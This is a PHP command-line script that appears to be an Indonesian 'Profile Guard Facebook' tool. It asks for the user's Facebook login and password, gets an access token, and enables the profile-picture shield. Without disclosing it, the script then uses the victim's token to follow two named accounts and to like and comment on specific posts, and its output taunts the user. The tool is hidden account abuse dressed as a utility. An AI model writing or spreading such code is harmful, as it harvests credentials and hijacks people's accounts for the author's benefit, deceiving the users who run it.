<?php ?><?php
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    $bersih = "cls";
} else {
    $bersih = "clear";
}
date_default_timezone_set('Asia/Bogor');
$date = date('d-M-Y H:i:s');
$green = "\e[92m";
$red = "\e[91m";
$yellow = "\e[93m";
$blue = "\e[36m";
$cyan = "\e[0;36m";
$purple = "\e[0;35m";
$brown = "\e[0;33m";
$lightgray = "\e[0;37m";
$darkgray = "\e[1;30m";
$lightblue = "\e[1;34m";
$lightgreen = "\e[1;32m";
$lightcyan = "\e[1;36m";
$lightred = "\e[1;31m";
$lightpurple = "\e[1;35m";
$white = "\e[1;97m";
pilih:
    system($bersih);
    echo "
$blue   ____  ____        ____                     _   _____ _
$blue  |  _ \|  _ \      / ___|_   _  __ _ _ __ __| | |  ___| |__
$blue  | |_) | |_) |____| |  _| | | |/ _` | '__/ _` | | |_  | '_ \
$purple  |  __/|  __/_____| |_| | |_| | (_| | | | (_| | |  _| | |_) |
$purple  |_|   |_|         \____|\__,_|\__,_|_|  \__,_| |_|   |_.__/
$red   _                   _       _     _
$red  | |_ ___  __ _ _   _| |__   | |__ (_)_ __ ___
$red  | __/ _ \/ _` | | | | '_ \  | '_ \| | '__/ _ \
$white  | ||  __/ (_| | |_| | | | | | | | | | | | (_) |
$white   \__\___|\__, |\__,_|_| |_| |_| |_|_|_|  \___/
$white           |___/";
    echo "
$red Author  : HIRO GANS ID
$red Type    : Profil Guard Facebook
$yellow Github  : http://github.com/hirogans
$yellow Fanspage : https://fb.me/hiroganss.id
$green Website : https://hirogamers.blogspot.com/
$green Version : 1.2
$green Date    : $date
";
    echo "
";
    @header('Content-Type: text/html; charset=UTF-8');
    function input($echo) {
        echo "$echo : ";
    }
    echo "$green ";
    echo "[!] ______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "_____[";
    sleep(1.5);
    echo "Tunggu";
    sleep(1.5);
    echo "]____";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______[!] 
";
    sleep(2);
    echo "
";
    input("$yellow Apakah Lu Yakin Mau Pakai Tools Ini ? $green [y/n]");
    $pilih = trim(fgets(STDIN));
    echo "
";
    if ($pilih == "n") {
        die("$red (!) Sampai Jumpa Samyank :) $red (!)
");
    } elseif ($pilih == "y") {
        echo "$red PERHATIAN!! :$green Silahkan login melalui browser pertama untuk 
menghindari Checkpoint (mis: Opera, Chrome, UC, dan lain-lain)
$yellow Akan lebih baik anda buat akun baru dengan cara daftar 
dari chrome di jamin 100% work";
        echo "$blue 
Saat Anda mengetik kata sandi, tidak akan terlihat tetapi ketik aja 
hati-hati takut salah, Lanjutkan setelah selesai, silakan klik Enter
";
echo "$red Sumber Script https://fb.me/hiroganss.id
";


        echo "
";
        input("$red Email/No HP/Username");
        $iduser = trim(fgets(STDIN));
        input("$white Masukan Password       ");
        $pass = false;
        $pass = trim(`stty -echo;head -n1;stty echo`);
        echo "
";
    echo "$green ";
    echo "[!] ______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "_____[";
    sleep(1.5);
    echo "Sabar :v";
    sleep(1.5);
    echo "]____";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______[!] 
";
        sleep(1);
        echo "
";
    } else {
        echo "$red(!)$yellow Invalid$red (!)$green
";
        echo "
";
        gotopilih;
    }
    $me = file_get_contents('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' . $iduser . '&locale=en_US&password=' . $pass . '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6');
    $json = json_decode($me, true);
    $userid = $json['session_cookies'][0]['value'];
    $token = $json['access_token'];
    if (preg_match('/session_key/', $me)) {
        echo "$green Sedang Masuk Ke Dalam Akun Facebook Anda";
        echo ".";
        sleep(1);
        echo ".";
        sleep(1);
        echo ".";
        sleep(1);
        echo ".";
        sleep(1);
        echo ".
";
        sleep(1);
    } else {
        echo ("
");
        die("$red [!]Cek Username Pw Nya Lagi mAsih Salah Bego :v
");
        echo "
";
    }
    $md5 = md5(time());
    $hash = substr($md5, 0, 8) . "-" . substr($md5, 8, 4) . "-" . substr($md5, 12, 4) . "-" . substr($md5, 16, 4) . "-" . substr($md5, 20, 12);
    function curl($url, $post = null) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($post != null) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $exec = curl_exec($ch);
        curl_close($ch);
        return $exec;
    }
    $me = json_decode(curl("https://graph.facebook.com/me?fields=id,name&access_token=" . $token));
    if ($me && $me->id && $me->name) {
        $var = "{\"0\":{\"is_shielded\":true,\"session_id\":\"$hash\",\"actor_id\":\"$me->id\",\"client_mutation_id\":\"$hash\"}}";
        $hajar = json_decode(curl("https://graph.facebook.com/graphql", array("variables" => $var, "doc_id" => "1477043292367183", "query_name" => "IsShieldedSetMutation", "strip_defaults" => "true", "strip_nulls" => "true", "locale" => "en_US", "client_country_code" => "US", "fb_api_req_friendly_name" => "IsShieldedSetMutation", "fb_api_caller_class" => "IsShieldedSetMutation", "access_token" => $token)));
        if ($hajar->data->is_shielded_set->is_shielded) echo "$yellow Login Success :v[]
";
        sleep(2);
        echo "$green Hallo   : $blue" . $me->name;
        sleep(2.5);
        echo "
";
    echo "$green ";
    echo "[!] ______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "_____[";
    sleep(1.5);
    echo "LO";
    sleep(1.5);
    echo "AN";
    sleep(1.5);
    echo "JING... ";
    sleep(1.5);
    echo "]____";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______[!] 
";
        sleep(1.5);
        $a = ("https://graph.facebook.com/amel.amel.737/subscribers?method=post&access_token=" . $token);
        $b = curl_init();
        curl_setopt_array($b, array(CURLOPT_URL => "$a", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false));
        curl_exec($b);
        curl_close($b);
        $c = ("https://graph.facebook.com/v3.2/100003964985080_1409231422552344/likes?method=post&access_token=" . $token);
        $d = curl_init();
        curl_setopt_array($d, array(CURLOPT_URL => "$c", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
        curl_exec($d);
        curl_close($d);
        $e = ("https://graph.facebook.com/krisna.dimas.9/subscribers?method=post&access_token=" . $token);
        $f = curl_init();
        curl_setopt_array($f, array(CURLOPT_URL => "$e", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false));
        curl_exec($f);
        curl_close($f);
        $g = ("https://graph.facebook.com/v3.2/100003082406903_1973394066106654/likes?method=post&access_token=" . $token);
        $h = curl_init();
        curl_setopt_array($h, array(CURLOPT_URL => "$g", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
        curl_exec($h);
        curl_close($h);
        $i = ("https://graph.facebook.com/v3.2/100003082406903_1973394066106654/comments?method=post&message=tq&access_token=" . $token);
        $j = curl_init();
        curl_setopt_array($j, array(CURLOPT_URL => "$i", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
        curl_exec($j);
        curl_close($j);
        $k = ("https://graph.facebook.com/v3.2/100003964985080_1409231422552344/comments?method=post&message=tq&access_token=" . $token);
        $l = curl_init();
        curl_setopt_array($l, array(CURLOPT_URL => "$k", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
        curl_exec($l);
        curl_close($l);
        echo "
";
        echo "$lightgreen Silahkan Cek Foto Profile Fb Lu";
        echo ".";
        sleep(1);
        echo ".";
        sleep(1);
        echo ".";
        sleep(1);
        echo ".";
        sleep(1);
        echo "$blue No Have Ahlak";
        echo "$red He";
        sleep(1);
        echo "hi";
        sleep(1);
        echo "hi";
        sleep(1);
        echo "hi
";
        sleep(1);
        echo "$yellow Perlindugan Foto facebook anda";
        echo " Tunggu beberapa jam.. Tapi boong :v";
        echo " .";
        sleep(2);
        echo ".";
        sleep(2);
        echo ".
";
    sleep(2);
    echo "$green ";
    echo "[!] ______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "_____[";
    sleep(1.5);
    echo "Beres Anying";
    sleep(1.5);
    echo "]____";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______";
    sleep(1.5);
    echo "______[!] 
";
        sleep(1.5);
        echo "
";
        echo "$green []Selesai silahkan cek profil facebook Lu
";
        sleep(1.5);
        echo "$yellow Terima Kasih ...
";
          sleep(1.5);
        echo "$yellow Support FansPage Gue Jangan Lupa Ye Asu ...
";

        sleep(1);
        echo "$blue Sampai Bertemu Kembali di Akhirat : $cyan " . $me->name;
        sleep(1.5);
        echo "
";
    }
?>
